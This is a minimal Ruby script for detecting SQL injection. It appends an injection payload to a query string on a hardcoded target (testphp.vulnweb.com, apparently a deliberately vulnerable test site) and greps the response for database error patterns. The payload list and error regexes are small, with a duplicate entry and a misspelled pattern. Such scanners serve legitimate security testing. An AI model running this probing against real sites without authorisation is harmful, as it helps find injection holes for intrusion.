#!/usr/bin/env ruby
#
#basic sqli scanner

require 'net/http'

#some SQLi payloads
payloads = 
    [
      "'",
      "'",
      "' or 1=2--+"
    ]

#some database error response
errors = 
  {
    :mysql => [
                "SQL.*syntax",
                "mysql.*(fetch).*array",
                "Warnng"
              ],
    :mssql => [
                "line.*[0-9]",
                "Microsoft SQL Native Client error.*"
              ],
    :oracle => [
                ".*ORA-[0-9].*",
                "Warning"
               ]
  }

#target site
uri = URI.parse "http://testphp.vulnweb.com/artists.php?artist=1"

#update query with payload
uri.query += payloads[0]

#send get request
response = Net::HTTP.get uri

#find error if any
puts "[+] #{URI(uri.to_s)} is vulnerable!" unless response.match(/#{errors[:mysql][0]}/i).nil?
